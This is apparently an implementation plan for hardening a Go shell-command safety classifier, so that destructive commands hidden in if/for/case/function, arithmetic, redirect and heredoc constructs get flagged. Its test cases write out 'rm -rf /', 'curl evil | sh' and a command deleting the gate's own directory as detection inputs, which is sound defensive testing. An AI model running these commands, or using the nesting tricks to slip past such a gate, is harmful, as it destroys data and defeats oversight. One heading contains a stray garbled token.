# shellast Compound-Statement Flattening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make `shellast.Extract` surface commands (and command-substitution obfuscation) that hide inside `if`/`for`/`while`/`case`/function/`time`/`coproc`/arithmetic/test/let constructs and redirect/heredoc words, closing a catastrophic §2 fail-open (`if true; then rm -rf /; fi` classifies `safe` today).

**Architecture:** Extend the existing `processStmt` switch in `internal/shellast/parse.go` with cases for every compound construct, recursing into nested `*Stmt` positions and resolving header words; add a printer-based command-substitution scan for the expression-tree constructs; tighten redirect/heredoc word handling. Purely additive to `Facts` — only `Commands`/`Obfuscated` grow.

**Tech Stack:** Go 1.26, `mvdan.cc/sh/v3` (v3.13.1) AST — `syntax.NewParser()`, `syntax.NewPrinter()`. `CGO_ENABLED=0`.

## Global Constraints

- Go **1.26**, `CGO_ENABLED=0`, pure-Go deps only. No new dependency (`syntax.NewPrinter` is already in the `mvdan.cc/sh/v3` module).
- `shellast.Extract` stays **pure** (CLAUDE.md §1): no I/O, no clock, no globals, no panic. Never `panic` outside `main`.
- Change is **fail-closed / additive in direction**: only ever surface *more* commands or set `Obfuscated`; never make a currently-caught command uncaught, never lower a severity.
- Every evasion construct gets a **corpus entry that must stay caught** (CLAUDE.md Testing). Table-driven tests, deterministic.
- One file, one responsibility; wrap errors with `%w`; doc comments say *why*.
- Conventional commits, identity `lucasngucii <lucasalehwork@gmail.com>`, **never** a `Co-Authored-By: Claude` trailer. Commit at each green.
- Source of truth: `docs/superpowers/specs/2026-07-30-shellast-compound-flatten-design.md`.

---

### Task 1: Recurse into compound-statement bodies (if/while/for/case/func/time/coproc)

**Files:**
- Modify: `internal/shellast/parse.go` (the `processStmt` switch, currently `internal/shellast/parse.go:89-111`)
- Test: `internal/shellast/parse_test.go` (or the existing shellast test file — match where `Extract`/`hasCmd` are already tested)

**Interfaces:**
- Consumes: `syntax.Stmt`, `syntax.IfClause`, `syntax.WhileClause`, `syntax.ForClause`, `syntax.CaseClause`, `syntax.FuncDecl`, `syntax.TimeClause`, `syntax.CoprocClause` (all from `mvdan.cc/sh/v3/syntax`); the existing `processStmt(stmt *syntax.Stmt, vars map[string]string, f *Facts)`.
- Produces: nested commands now appear in `f.Commands`; no signature change.

- [ ] **Step 1: Write the failing test**

Add to the shellast test file. Use the existing test helper style (`Extract` + `hasCmd`; `hasCmd` is unexported in package `shellast` at `internal/shellast/parse.go:272`, so this test lives in package `shellast`).

```go
func TestFlattenCompoundBodies(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
	}{
		{"if-then", "if true; then rm -rf /; fi; ls /tmp"},
		{"if-cond", "if rm -rf /; then echo x; fi"},
		{"if-elif", "if false; then :; elif rm -rf /; then :; fi"},
		{"if-else", "if false; then :; else rm -rf /; fi"},
		{"for-do", "for f in a b; do rm -rf /; done"},
		{"while-do", "while true; do rm -rf /; break; done"},
		{"until-do", "until false; do rm -rf /; done"},
		{"case-arm", "case x in x) rm -rf /;; esac"},
		{"func-body", "rmx(){ rm -rf /; }"},
		{"time", "time rm -rf /"},
		{"coproc", "coproc rm -rf /"},
		{"nested", "if true; then for f in x; do rm -rf /; done; fi"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !hasCmd(Extract(tc.cmd), "rm") {
				t.Fatalf("%q: rm must surface in Commands", tc.cmd)
			}
		})
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/shellast/ -run TestFlattenCompoundBodies -v`
Expected: FAIL — most subcases show `rm` absent (the constructs fall through the switch today).

- [ ] **Step 3: Add the compound-statement cases to `processStmt`**

In `internal/shellast/parse.go`, inside the `switch c := stmt.Cmd.(type)` block (after the existing `*syntax.Subshell` case, before the closing `}`), add:

```go
	case *syntax.IfClause:
		// Both branches and the condition run; walk the elif/else chain.
		for cur := c; cur != nil; cur = cur.Else {
			for _, s := range cur.Cond {
				processStmt(s, vars, f)
			}
			for _, s := range cur.Then {
				processStmt(s, vars, f)
			}
		}
	case *syntax.WhileClause:
		for _, s := range c.Cond {
			processStmt(s, vars, f)
		}
		for _, s := range c.Do {
			processStmt(s, vars, f)
		}
	case *syntax.ForClause:
		// Loop-header words are handled in a later step; the body's commands
		// run and must be seen. The loop variable is deliberately left unbound
		// (see spec: an unresolved `$f` asks, consistent with any unknown var).
		for _, s := range c.Do {
			processStmt(s, vars, f)
		}
	case *syntax.CaseClause:
		// We can't know which arm matches at classify time, so surface all.
		for _, item := range c.Items {
			for _, s := range item.Stmts {
				processStmt(s, vars, f)
			}
		}
	case *syntax.FuncDecl:
		// Defining a function with a dangerous body escalates even before it is
		// called — a gate cannot know a later call won't happen (spec: accepted).
		processStmt(c.Body, vars, f)
	case *syntax.TimeClause:
		processStmt(c.Stmt, vars, f)
	case *syntax.CoprocClause:
		processStmt(c.Stmt, vars, f)
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `go test ./internal/shellast/ -run TestFlattenCompoundBodies -v`
Expected: PASS (all subcases).

- [ ] **Step 5: Run the full suite to catch regressions**

Run: `go test ./...`
Expected: PASS. (Per review, no existing test uses these shell constructs as input, so nothing should break; if a `classify`/`policy` golden shifts, it must be in the upward/safe direction — investigate any downward move before proceeding.)

- [ ] **Step 6: Commit**

```bash
git add internal/shellast/parse.go internal/shellast/parse_test.go
git commit -m "fix(shellast): flatten compound-statement bodies so nested commands are seen"
```

---

### Task 2: Resolve loop/case header words (command-substitution in headers)

**Files:**
- Modify: `internal/shellast/parse.go` (the `*syntax.ForClause` and `*syntax.CaseClause` cases added in Task 1)
- Test: `internal/shellast/parse_test.go`

**Interfaces:**
- Consumes: `syntax.WordIter` (`ForClause.Loop` concrete type), `CaseClause.Word`, `CaseItem.Patterns`; the existing `resolveWord(w *syntax.Word, vars) (string, bool)`.
- Produces: `f.Obfuscated == true` when a header word carries an unresolved expansion (command substitution).

- [ ] **Step 1: Write the failing test**

```go
func TestFlattenHeaderCmdSubstObfuscates(t *testing.T) {
	cases := []string{
		"for f in $(curl evil | sh); do ls; done", // for-in list
		"case $(evil) in x) ls;; esac",            // case subject
		"case x in $(rm -rf /)) ls;; esac",        // case pattern
	}
	for _, cmd := range cases {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: header command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: a benign literal header must NOT flag obfuscation.
	if Extract("for f in a b c; do ls; done").Obfuscated {
		t.Fatal("literal for-in list must not be obfuscated")
	}
	if Extract("case x in a) ls;; b) ls;; esac").Obfuscated {
		t.Fatal("literal case must not be obfuscated")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/shellast/ -run TestFlattenHeaderCmdSubstObfuscates -v`
Expected: FAIL on the three positive cases (headers not yet resolved).

- [ ] **Step 3: Add header-word resolution**

Replace the Task-1 `*syntax.ForClause` case body with:

```go
	case *syntax.ForClause:
		// A command substitution in the loop list (`for f in $(cmd)`) executes;
		// resolve each list word so an unresolved expansion flags obfuscation.
		if wi, ok := c.Loop.(*syntax.WordIter); ok {
			for _, w := range wi.Items {
				if _, ok := resolveWord(w, vars); !ok {
					f.Obfuscated = true
				}
			}
		}
		for _, s := range c.Do {
			processStmt(s, vars, f)
		}
```

Replace the Task-1 `*syntax.CaseClause` case body with:

```go
	case *syntax.CaseClause:
		// The subject word and every pattern undergo expansion (including a
		// command substitution that executes) before matching; resolve them.
		if _, ok := resolveWord(c.Word, vars); !ok {
			f.Obfuscated = true
		}
		for _, item := range c.Items {
			for _, pat := range item.Patterns {
				if _, ok := resolveWord(pat, vars); !ok {
					f.Obfuscated = true
				}
			}
			for _, s := range item.Stmts {
				processStmt(s, vars, f)
			}
		}
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `go test ./internal/shellast/ -run TestFlattenHeaderCmdSubstObfuscates -v`
Expected: PASS.

- [ ] **Step 5: Run the full suite**

Run: `go test ./...`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/shellast/parse.go internal/shellast/parse_test.go
git commit -m "fix(shellast): flag command substitution in for/case header words"
```

---

### Task 3: Render-and-scan arithmetic/test/let for command substitution

**Files:**
- Modify: `internal/shellast/parse.go` (a new `hasCmdSubst` helper + a switch case)
- Test: `internal/shellast/parse_test.go`

**Interfaces:**
- Consumes: `syntax.NewPrinter()`, `syntax.Node`; `syntax.ArithmCmd`, `syntax.LetClause`, `syntax.TestClause`.
- Produces: `hasCmdSubst(node syntax.Node) bool`; `f.Obfuscated == true` for these constructs when they contain a command substitution.

- [ ] **Step 1: Write the failing test**

```go
func TestArithmTestLetCmdSubstObfuscates(t *testing.T) {
	for _, cmd := range []string{
		"(( $(rm -rf /) ))",
		"let x=$(rm -rf /)",
		"[[ $(rm -rf /) ]]",
	} {
		if !Extract(cmd).Obfuscated {
			t.Fatalf("%q: command substitution must set Obfuscated", cmd)
		}
	}
	// Negative: plain arithmetic/test/let must stay clean.
	for _, cmd := range []string{"(( 1 + 2 ))", "[[ -f myfile ]]", "let x=1"} {
		if Extract(cmd).Obfuscated {
			t.Fatalf("%q: benign construct must not be obfuscated", cmd)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/shellast/ -run TestArithmTestLetCmdSubstObfuscates -v`
Expected: FAIL on the three positive cases (these constructs fall through the switch).

- [ ] **Step 3: Add the `hasCmdSubst` helper**

Add near the other unexported helpers in `internal/shellast/parse.go` (e.g. after `resolveParts`). Import `bytes` is not needed — use `strings.Builder`; `syntax` is already imported.

```go
// hasCmdSubst reports whether a node's source text carries a command
// substitution (`$(...)` or backticks). Used for arithmetic/test/let
// constructs whose expression trees (ArithmExpr/TestExpr) are not a flat word
// list: rendering the node back to source and substring-scanning is coarse but
// fail-closed — a `$(...)` inside `(( … ))` / `[[ … ]]` / `let …` executes when
// the shell evaluates it, so it must flag obfuscation. A render error fails
// closed (treated as containing one).
func hasCmdSubst(node syntax.Node) bool {
	var b strings.Builder
	if err := syntax.NewPrinter().Print(&b, node); err != nil {
		return true
	}
	s := b.String()
	return strings.Contains(s, "$(") || strings.Contains(s, "`")
}
```

- [ ] **Step 4: Add the switch case**

Inside the `processStmt` switch (after the `*syntax.CoprocClause` case), add:

```go
	case *syntax.ArithmCmd, *syntax.LetClause, *syntax.TestClause:
		// No nested *Stmt to recurse, but a command substitution inside the
		// expression executes. Scan the rendered source (see hasCmdSubst); pass
		// the whole stmt so the full construct is rendered.
		if hasCmdSubst(stmt) {
			f.Obfuscated = true
		}
```

- [ ] **Step 5: Run the test to verify it passes**

Run: `go test ./internal/shellast/ -run TestArithmTestLetCmdSubstObfuscates -v`
Expected: PASS.

- [ ] **Step 6: Run the full suite**

Run: `go test ./...`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add internal/shellast/parse.go internal/shellast/parse_test.go
git commit -m "fix(shellast): flag command substitution in arithmetic/test/let constructs"
```

---

### Task 4: Tighten redirect-target and heredoc-body handling

**Files:**
- Modify: `internal/shellast/parse.go` (the redirect loop at the top of `processStmt`, currently `internal/shellast/parse.go:83-88`)
- Test: `internal/shellast/parse_test.go`

**Interfaces:**
- Consumes: `syntax.Redirect.Word`, `syntax.Redirect.Hdoc` (both `*syntax.Word`); `resolveWord`.
- Produces: `f.Obfuscated == true` when a redirect target or heredoc body carries a command substitution.

- [ ] **Step 1: Write the failing test**

```go
func TestRedirectAndHeredocCmdSubstObfuscates(t *testing.T) {
	if !Extract("cat < $(rm -rf /)").Obfuscated {
		t.Fatal("command substitution in a redirect target must set Obfuscated")
	}
	hdoc := "cat <<EOF\n$(rm -rf /)\nEOF\n"
	if !Extract(hdoc).Obfuscated {
		t.Fatal("command substitution in a heredoc body must set Obfuscated")
	}
	// Negative: a plain redirect/heredoc must stay clean.
	if Extract("cat < myfile").Obfuscated {
		t.Fatal("plain redirect must not be obfuscated")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test ./internal/shellast/ -run TestRedirectAndHeredocCmdSubstObfuscates -v`
Expected: FAIL — the redirect loop discards the resolve bool and never reads `Hdoc`.

- [ ] **Step 3: Update the redirect loop**

Replace the redirect loop at the top of `processStmt` (`internal/shellast/parse.go:83-88`):

```go
	for _, r := range stmt.Redirs {
		if r.Word != nil {
			text, _ := resolveWord(r.Word, vars)
			f.Redirects = append(f.Redirects, text)
		}
	}
```

with:

```go
	for _, r := range stmt.Redirs {
		if r.Word != nil {
			text, ok := resolveWord(r.Word, vars)
			if !ok {
				f.Obfuscated = true // e.g. `cat < $(cmd)` — the sub executes
			}
			f.Redirects = append(f.Redirects, text)
		}
		if r.Hdoc != nil {
			if _, ok := resolveWord(r.Hdoc, vars); !ok {
				f.Obfuscated = true // `$(cmd)` in a heredoc body executes
			}
		}
	}
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `go test ./internal/shellast/ -run TestRedirectAndHeredocCmdSubstObfuscates -v`
Expected: PASS.

- [ ] **Step 5: Run the full suite**

Run: `go test ./...`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/shellast/parse.go internal/shellast/parse_test.go
git commit -m "fix(shellast): flag command substitution in redirect targets and heredoc bodies"
```

---

### Task 5: End-to-end classifier golden cases + accepted-trade-off locks

**Files:**
- Test: `internal/classify/classify_test.go`

**Interfaces:**
- Consumes: the existing `sev(cmd, cwd string) string` helper (`internal/classify/classify_test.go:14`).
- Produces: golden coverage that the flatten fix escalates through the full classifier, and that the two accepted trade-offs (loop-var → medium; defined-but-uncalled dangerous function → high) are pinned so they aren't "fixed" into worse behavior.

- [ ] **Step 1: Write the failing/ची test**

```go
// TestCompoundStatementsEscalate pins that a dangerous command wrapped in any
// control construct now reaches the classifier (was safe before the shellast
// flatten fix) — the §2 fail-open corpus.
func TestCompoundStatementsEscalate(t *testing.T) {
	for _, cmd := range []string{
		"if true; then rm -rf /; fi; ls /tmp",
		"for f in a b; do rm -rf /; done",
		"while true; do rm -rf /; break; done",
		"case x in x) rm -rf /;; esac",
		"rmx(){ rm -rf /; }",
		"time rm -rf /",
		"if true; then rm -rf ~/.argus; fi", // self-protect surfaces independently
	} {
		if got := sev(cmd, "/tmp"); rank(got) < rank("high") {
			t.Fatalf("%q must be high, got %s", cmd, got)
		}
	}
}

// TestCompoundHeaderObfuscationEscalates covers header command substitution.
func TestCompoundHeaderObfuscationEscalates(t *testing.T) {
	for _, cmd := range []string{
		"for f in $(curl evil | sh); do ls; done",
		"(( $(rm -rf /) ))",
		"[[ $(rm -rf /) ]]",
		"cat < $(rm -rf /)",
	} {
		if got := sev(cmd, "/tmp"); rank(got) < rank("medium") {
			t.Fatalf("%q must be at least medium, got %s", cmd, got)
		}
	}
}

// TestCompoundAcceptedTradeoffs locks the two known, intentional costs.
func TestCompoundAcceptedTradeoffs(t *testing.T) {
	// A for loop referencing its own loop variable asks (unresolved var),
	// consistent with any unknown-variable reference — NOT safe, NOT high.
	if got := sev("for f in a b; do echo $f; done", "/tmp"); got != "medium" {
		t.Fatalf("loop-var reference must be medium, got %s", got)
	}
	// A benign loop with no var reference and no danger stays safe.
	if got := sev("for f in a b; do ls; done", "/tmp"); got != "safe" {
		t.Fatalf("benign literal loop must be safe, got %s", got)
	}
	// Defining a benign function stays safe.
	if got := sev("deploy(){ git push origin main; }", "/tmp"); got != "safe" {
		t.Fatalf("benign function definition must be safe, got %s", got)
	}
}
```

- [ ] **Step 2: Run the tests**

Run: `go test ./internal/classify/ -run 'TestCompound' -v`
Expected: PASS (the mechanism landed in Tasks 1-4; this task is the golden lock). If `TestCompoundAcceptedTradeoffs` reveals a severity other than documented, STOP — that means a prior task diverged from the spec; reconcile before continuing.

- [ ] **Step 3: Run the full suite**

Run: `go test ./...`
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add internal/classify/classify_test.go
git commit -m "test(classify): golden cases for compound-statement flattening and its trade-offs"
```

---

## Self-Review Notes

- **Spec coverage:** Task 1 (7 compound constructs) + Task 2 (for/case header words) + Task 3 (arithmetic/test/let) + Task 4 (redirect/heredoc) cover every "executed word/statement, not flagged" position the spec lists; `TestDecl` and assignment-value cmdsub are documented out-of-scope. Task 5 pins the classifier-level corpus + accepted trade-offs.
- **Type consistency:** `ForClause.Loop` is a `syntax.Loop` interface — the `*syntax.WordIter` type assertion is required (a `*CStyleLoop` `for ((…))` has no word list and is correctly skipped). `FuncDecl.Body`/`TimeClause.Stmt`/`CoprocClause.Stmt` are single `*syntax.Stmt` (pass directly); `IfClause.Cond/Then`, `WhileClause.Cond/Do`, `ForClause.Do`, `CaseItem.Stmts` are `[]*syntax.Stmt` (range). `processStmt` guards `nil` at its top, so passing a possibly-nil `.Stmt`/`.Body` is safe.
- **No placeholders:** every step has runnable commands and complete code.
